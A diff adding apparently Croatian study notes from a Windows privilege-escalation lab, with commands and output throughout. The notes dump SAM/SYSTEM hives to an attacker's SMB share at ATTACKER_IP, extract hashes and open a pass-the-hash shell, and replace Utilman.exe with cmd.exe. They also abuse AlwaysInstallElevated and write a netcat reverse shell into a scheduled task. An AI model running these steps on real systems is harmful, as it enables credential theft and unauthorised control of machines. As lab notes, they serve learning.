@@ -1,0 +1,106 @@
+Fun fact: Svaki korisnik moze provjeriti svoje privilegije preko whoami /priv
+
+SeBackup / SeRestore
+Exploit se bazira na tome da neprivilegirani korisnici mogu napraviti backup sustava.
+Mi cemo pokusati doci do do datoteke system.hive i sam.hive (oni predtavljaju sam i system hashove)
+Prvo moramo provjeriti imamo li ovlasti za SeBackup i SeRestore
+Ako imamo mozemo izvrsiti backup.
+
+C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+
+Kako bi izvukli sadrzaj iz datoteka, na nasoj masini stvaramo SMB server (server message block).
+
+user@attackerpc$ mkdir share
+user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username WinUser -password WinUserPass public share
+
+i kopiramo na tu lokaciju da napadač može lokalno izvuci sve informacije.
+
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+
+user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.175.90.....
+[*] Found writable share ADMIN$
+[*] Uploading file nfhtabqO.exe
+[*] Opening SVCManager on 10.10.175.90.....
+[*] Creating service RoLE on 10.10.175.90.....
+[*] Starting service RoLE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32> 
+
+
+SeTakeOwnership
+Privilegija SeTakeOwnership omogucuje korisniku da preuzme vlasnistvo nad svakim objektom u sustavu (ukljucujuci registry)
+U ovome napadu cemo preuzeti vlasnistvo nad datotekom utilman.exe
+Napad izgleda ovako:
+
+C:\> takeown /f C:\Windows\System32\Utilman.exe //Preuzimanje
+C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F //davanje ovlasti pokretanja za korisnika 
+C:\Windows\System32\> copy cmd.exe utilman.exe //promjena datoteke utilma u cmd.exe
+
+I sada kada pokrenemo u login ekranu Ease of Access cemo pokrenuti cmd kao root korisnik
+
+SeImpersonate / SeAssignPrimaryToken
+Ove privilegije omogucuju korisnika da zapocinje procese u ime drugog korisnika.
+Potrebne dozvole za izvodenje ovoga su SeImpersonatePrivilage i SeAssignPrimaryTokenPrivilage.
+
+Koristimo exploit RogueWinRM.exe. Bez exploita kada korisnik započne BIS servis na windows, stavara se konekcija na portu 5985 sa system privilegijama.
+Port 5985 se koristi za WinRM servis, te je više manje exposani port koji sadrži Powershell konzolu. 
+Ako WinRM nije pokrenut na racunalu zrtve, mozemo pokrenuti vlastiti WinRM servis na tome portu i uhvatiti autentifikacijske zahtjeve i izvršiti naredbu.
+
+
+AlwaysInstallElevated
+Generalno instalacijske datoteke (.msi) su konfigurirane da se instaliraju u modu kao korisnik koji ih pokrece.
+No moze se dogoditi miskonfiguracije gdje zbog losih postavki im je dopusteno pokretanje kao privilegirani korisnik.
+To možemo provjeriti preko:
+
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+Da bi radilo na oba trebamo dobiti odgovor true, tj set.
+Ako je postavljeno mozemo kreirati .msi datoteku preko msfvenoma i pokrenuti je preko:
+
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+
+
+Scheduled tasks
+U windowsu mozemo pogledati cronjobove koji se vrše preko naredbe "schtasks" koji ce ispisati sve zadatke.
+Nas zanima Run as user i Task to run, te je li task to run moguce promjeniti kao trenutni korisnik.
+Ispis schtasks:
+C:\> schtasks /query /tn vulntask /fo list /v
+Folder: \
+HostName:                             THM-PC1
+TaskName:                             \vulntask
+Task To Run:                          C:\tasks\schtask.bat
+Run As User:                          taskusr1
+
+kako bi pregledali ovlasti nad datotekom koristimo naredbu icacls nad njom.
+C:\> icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+
+Ako imamo ovlasti F (Full access) mozemo mjenjati sadržaj datoteke.
+Kako bi promjenili sadržaj datoteke isključivo premo cmd ili powerhsella, mozemo koristiti echo.
+
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9002 > C:\tasks\schtask.bat
+
+Nakon toga moramo cekati da se datoteka izvrsi, ili ako mozemo mozemo ju sami pokrenuti preko:
+
+schtasks /run /tn datoteka.exe
